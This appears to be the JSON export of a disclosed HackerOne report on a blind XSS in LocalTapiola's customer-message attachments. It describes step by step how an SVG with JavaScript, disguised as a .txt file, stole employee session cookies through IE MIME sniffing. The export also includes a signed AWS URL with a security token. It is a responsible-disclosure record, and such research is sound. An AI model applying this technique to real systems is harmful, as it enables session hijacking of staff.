+                    "url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/156/001/da967b566336b1c4b693edd160c8d51d44aa115b/img1.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2IMG7FL4%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T224311Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDHPJ1yKYcYWYj%2F9LNiK3AzyAo4x%2BPxakyZiJlRkk9M72fGqw4SrPH5qRWwrCEzUaWrTNXkqpALXRS4Q9wnQBmHJ21tNzuwZNzHm1q41ngqtlwpJP4F8P9DJ8J86pGXCj5zxKl27Xdyrp0yXro5KHbNg%2FMI31tP3CPajYLHppvbpzE4HgT6%2BgX56T9THRU9i0iPR2sPERJ5V8T5PqNGlaAxkIH%2BcDEYPwwdeod1TBqaVJeTbSTUwavuHFWj8I9aJc5ijS9LvHWHNGB5FXbFATn8ghcjqVzqIroA9nxNuPJ2vxIaAor9r4p%2Fy1e5TWqKKtSEWtQu68kIwE8NsRg80HQRso%2BCvRE8ecUk4iHSIS0Q3jmxteI2SvJRO0qZ3QaRjTDGmiTz95bj%2F%2F4H%2BR7Jy4C8RK9HLXC%2BPnDh%2FazH%2BgKdjL01iP%2BgzbXEnOyhh3IA5Imss19EK%2B2EWDifocttquTy%2F9L1a3OBtcs43O1R7Q7IURroixlPAhRunZI2Z9MyZSlDzcJsSgY9uPguXfm%2BdDi6ysAHwhyXucVtSiReGyNvDkzSArwNHacFF2yzh47gdSbs3NLHHvBIWOzk4ozBhf5yrOj2mTit4ouKem4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=75e1dc34eaa906e2cd7ac110eff4ad8479fdad0bc93de66e140179bbd7b05b11", 
+                    "type": "image/png", 
+                    "id": 156001, 
+                    "filename": "img1.png"
+                }
+            ], 
+            "automated_response": false, 
+            "created_at": "2017-01-30T11:11:09.215Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-01-30T11:11:09.215Z", 
+            "actor": {
+                "username": "putsi", 
+                "url": "/putsi", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/044/111/a49e6af6c29aa221dfeeb8efb4863c57cacc5337_medium.png?1505158469"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "localtapiola", 
+            "message": "The attachments are now shown as HTML-encoded (see img1) when viewed from Asiakassalkku. I also sent a message with a malicious file attachment to customer service and the XSS did not trigger anymore. \n\n**However** it seems that the original message is still saved as non-encoded (see img1) to L\u00e4hitapiola-servers! \nThis creates a new attack vector. I can send a message where I ask customer service to open the URL of the non-encoded file and it will probably trigger the XSS. If that works, the blind XSS will still affect verkkopalvelu.tapiola.fi-domain as the exploit-code is hosted on that domain.\n\nI'll test that and tell the results after the customer service opens the new message and URL.\n\n", 
+            "markdown_message": "<p>The attachments are now shown as HTML-encoded (see img1) when viewed from Asiakassalkku. I also sent a message with a malicious file attachment to customer service and the XSS did not trigger anymore. </p>\n\n<p><strong>However</strong> it seems that the original message is still saved as non-encoded (see img1) to L\u00e4hitapiola-servers! <br>\nThis creates a new attack vector. I can send a message where I ask customer service to open the URL of the non-encoded file and it will probably trigger the XSS. If that works, the blind XSS will still affect verkkopalvelu.tapiola.fi-domain as the exploit-code is hosted on that domain.</p>\n\n<p>I&#39;ll test that and tell the results after the customer service opens the new message and URL.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1451164, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-01-30T15:52:49.248Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-01-30T15:52:49.248Z", 
+            "actor": {
+                "username": "localtapiola-thomas", 
+                "url": "/localtapiola-thomas", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/060/017/631ceafd5b502a492e39ff6a10b5486da480bff2_medium.png?1457533770"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "localtapiola", 
+            "message": "Looking forward to that :)", 
+            "markdown_message": "<p>Looking forward to that :)</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1451598, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-02-02T14:44:18.892Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-02-02T14:44:31.808Z", 
+            "actor": {
+                "username": "putsi", 
+                "url": "/putsi", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/044/111/a49e6af6c29aa221dfeeb8efb4863c57cacc5337_medium.png?1505158469"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "localtapiola", 
+            "message": "Hey,\n\nThe customer service person said that she opened the direct attachment link and nothing happened and I didn't see any connections to the \"malicious\" http-server of mine. Thus I would consider this fixed as I can't think of any other way to exploit this without using an additional new vulnerability.\n\nHowever I still advice that you should also sanitize the original attachment file because it can possibly be used to host malicious javascript etc in verkkopalvelu.tapiola.fi-domain.", 
+            "markdown_message": "<p>Hey,</p>\n\n<p>The customer service person said that she opened the direct attachment link and nothing happened and I didn&#39;t see any connections to the &quot;malicious&quot; http-server of mine. Thus I would consider this fixed as I can&#39;t think of any other way to exploit this without using an additional new vulnerability.</p>\n\n<p>However I still advice that you should also sanitize the original attachment file because it can possibly be used to host malicious javascript etc in verkkopalvelu.tapiola.fi-domain.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1458590, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-02-02T14:48:49.891Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-02-02T14:48:49.891Z", 
+            "actor": {
+                "username": "localtapiola-thomas", 
+                "url": "/localtapiola-thomas", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/060/017/631ceafd5b502a492e39ff6a10b5486da480bff2_medium.png?1457533770"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "localtapiola", 
+            "message": "OK, thanks for the update!", 
+            "markdown_message": "<p>OK, thanks for the update!</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1458596, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-02-04T19:49:52.941Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-02-04T19:49:52.941Z", 
+            "actor": {
+                "username": "localtapiola-thomas", 
+                "url": "/localtapiola-thomas", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/060/017/631ceafd5b502a492e39ff6a10b5486da480bff2_medium.png?1457533770"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "localtapiola", 
+            "message": "We have the next bounty meeting in a few weeks, so some patience needed. Anyway, we regard this as fixed and we will also go for limited disclosure so none of your personal information will be at risk.", 
+            "markdown_message": "<p>We have the next bounty meeting in a few weeks, so some patience needed. Anyway, we regard this as fixed and we will also go for limited disclosure so none of your personal information will be at risk.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1463141, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "reporter": {
+                "username": "putsi", 
+                "url": "/putsi"
+            }, 
+            "created_at": "2017-02-16T22:35:17.541Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-02-16T22:35:17.541Z", 
+            "actor": {
+                "username": "localtapiola-thomas", 
+                "url": "/localtapiola-thomas", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/060/017/631ceafd5b502a492e39ff6a10b5486da480bff2_medium.png?1457533770"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "localtapiola", 
+            "message": "Let's resolve this now. Is it OK for you, if we go for full disclosure? I tried to look at all the screengrabs and such and did not find anything really personal in there, so full disclosure is ok for us.  Awaiting your comments.", 
+            "markdown_message": "<p>Let&#39;s resolve this now. Is it OK for you, if we go for full disclosure? I tried to look at all the screengrabs and such and did not find anything really personal in there, so full disclosure is ok for us.  Awaiting your comments.</p>\n", 
+            "type": "Activities::BugResolved", 
+            "id": 1490262, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-02-16T23:03:41.066Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-02-16T23:03:41.066Z", 
+            "actor": {
+                "username": "putsi", 
+                "url": "/putsi", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/044/111/a49e6af6c29aa221dfeeb8efb4863c57cacc5337_medium.png?1505158469"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "localtapiola", 
+            "message": "Yep full disclosure is ok for me.", 
+            "markdown_message": "<p>Yep full disclosure is ok for me.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1490315, 
+            "genius_execution_id": null
+        }, 
+        {
+            "bounty_currency": "usd", 
+            "automated_response": false, 
+            "created_at": "2017-02-22T11:16:56.135Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-02-22T11:16:56.135Z", 
+            "actor": {
+                "url": "/localtapiola", 
+                "profile": {
+                    "name": "LocalTapiola"
+                }, 
+                "ibb": false, 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/008/416/b913929e71e6e373cc437dbd4c96b7df758fdbe6_medium.png?1457688936"
+                }
+            }, 
+            "team_handle": "localtapiola", 
+            "bonus_amount": "0.0", 
+            "bounty_amount": "3000.0", 
+            "collaborator": {
+                "username": "putsi", 
+                "url": "/putsi"
+            }, 
+            "message": "Thank you for your efforts in our Bug Bounty program.", 
+            "markdown_message": "<p>Thank you for your efforts in our Bug Bounty program.</p>\n", 
+            "type": "Activities::BountyAwarded", 
+            "id": 1498940, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-02-22T11:17:15.314Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-02-22T11:17:15.314Z", 
+            "actor": {
+                "username": "localtapiola-thomas", 
+                "url": "/localtapiola-thomas", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/060/017/631ceafd5b502a492e39ff6a10b5486da480bff2_medium.png?1457533770"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "localtapiola", 
+            "first_to_agree": true, 
+            "message": "Full disclosure.", 
+            "markdown_message": "<p>Full disclosure.</p>\n", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 1498941, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-02-22T11:24:45.068Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-02-22T11:24:45.068Z", 
+            "actor": {
+                "username": "putsi", 
+                "url": "/putsi", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/044/111/a49e6af6c29aa221dfeeb8efb4863c57cacc5337_medium.png?1505158469"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "localtapiola", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 1498965, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-02-22T11:24:45.110Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-02-22T11:24:45.110Z", 
+            "actor": {
+                "username": "putsi", 
+                "url": "/putsi", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/044/111/a49e6af6c29aa221dfeeb8efb4863c57cacc5337_medium.png?1505158469"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "localtapiola", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportBecamePublic", 
+            "id": 1498966, 
+            "genius_execution_id": null
+        }
+    ], 
+    "in_validation?": false, 
+    "is_participant": false, 
+    "singular_disclosure_allowed": true, 
+    "reporter": {
+        "username": "putsi", 
+        "hacker_mediation": false, 
+        "hackerone_triager": false, 
+        "disabled": false, 
+        "url": "/putsi", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/044/111/233424ba88808cb50a8260226bf1af769be0f42d_small.png?1505158469"
+        }, 
+        "is_me?": false
+    }, 
+    "weakness": {
+        "id": 60, 
+        "name": "Cross-site Scripting (XSS) - Generic"
+    }, 
+    "is_external_bug": false, 
+    "visibility": "full", 
+    "allow_singular_disclosure_after": -53781955.67099247, 
+    "disclosed_at": "2017-02-22T11:24:45.093Z", 
+    "stage": 4, 
+    "url": "https://hackerone.com/reports/159498", 
+    "created_at": "2016-08-15T15:36:39.469Z", 
+    "original_report_url": null, 
+    "vulnerability_information_html": "<p>Hi,<br>\nI am pretty sure that I found a vulnerability similar to <a title=\"https://hackerone.com/reports/135154\" href=\"https://hackerone.com/reports/135154\">https://hackerone.com/reports/135154</a>.</p>\n\n<p>An adversary can use the &quot;L\u00e4het\u00e4 viesti&quot;-functionality of the L\u00e4hiTapiola Asiakassalkku to send a malicious file. When the customer service opens the file, an XSS will execute and will leak user IP address and L\u00e4hitapiola session cookies and also for example the &quot;tapiola.cem.uid&quot; which I suspect is the username of the employee (e.g. &quot;\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588&quot;).</p>\n\n<h2 id=\"steps-to-reproduce\">Steps to reproduce:</h2>\n\n<ol>\n<li>Log in to the L\u00e4hitapiola customer site (<a title=\"https://www.lahitapiola.fi/henkilo/asiakaspalvelu/asioi-verkossa/kirjaudu-verkkoon\" href=\"/redirect?signature=02ffcd7646c903784cd57d6bc8f983edd439ac1a&amp;url=https%3A%2F%2Fwww.lahitapiola.fi%2Fhenkilo%2Fasiakaspalvelu%2Fasioi-verkossa%2Fkirjaudu-verkkoon\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://www.lahitapiola.fi/henkilo/asiakaspalvelu/asioi-verkossa/kirjaudu-verkkoon</span><i class=\"icon-external-link\"></i></a>).</li>\n<li>Navigate to the &quot;L\u00e4het\u00e4 viesti&quot;-page (<a title=\"https://verkkopalvelu.tapiola.fi/a2/AskoWeb/faces/sivut/viesti/laheta.xhtml\" href=\"/redirect?signature=77a43e36fc590e05a0814a3772c948d556de2204&amp;url=https%3A%2F%2Fverkkopalvelu.tapiola.fi%2Fa2%2FAskoWeb%2Ffaces%2Fsivut%2Fviesti%2Flaheta.xhtml\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://verkkopalvelu.tapiola.fi/a2/AskoWeb/faces/sivut/viesti/laheta.xhtml</span><i class=\"icon-external-link\"></i></a>).</li>\n<li>Fill the fields with anything you want and click the &quot;Lataa liite&quot;-button and upload a malicious file (see the attached file kirje.txt).</li>\n<li>Send the message.</li>\n<li>Navigate to &quot;Postilaatikko&quot; and make sure that the message was sent and that the attachment is properly uploaded (see the attached image1.png and image2.png).</li>\n<li>The attached kirje.txt contains a SVG image file which is modified to contain malicious javascript that sends an AJAX-request to attacker&#39;s server (mine) and adds website cookies to the URL as GET-parameter. As the L\u00e4hitapiola employees are probably using Internet Explorer, the IE will sniff the MIME type from the file and open it as SVG instead of text/plain and it will trigger the XSS.</li>\n</ol>\n\n<h2 id=\"proof-of-exploitation\">Proof of exploitation</h2>\n\n<p>See the attacked file xsspoc.txt for an proof. The file is from my nginx-server logs and in the file you can see that an Lahitapiola employee (notice the IP-address) has opened the attachment and it triggered the XSS which sent the employees cookies to my server. </p>\n", 
+    "severity_rating": "critical", 
+    "team_private?": false, 
+    "team": {
+        "profile": {
+            "website": "http://www.lahitapiola.fi", 
+            "about": "LocalTapiola\u2019s products and services cover non-life, life and pension insurance, as well as investment and saving services.", 
+            "twitter_handle": "", 
+            "name": "LocalTapiola"
+        }, 
+        "handle": "localtapiola", 
+        "url": "https://hackerone.com/localtapiola", 
+        "state": "public_mode", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/008/416/23d72f4d3433458578a2ce1b4cc7574a935e2316_small.png?1457688936", 
+            "medium": "https://profile-photos.hackerone-user-content.com/000/008/416/b913929e71e6e373cc437dbd4c96b7df758fdbe6_medium.png?1457688936"
+        }, 
+        "awards_miles": false, 
+        "permissions": [], 
+        "id": 8416, 
+        "default_currency": "usd"
+    }, 
+    "is_published": false
+}
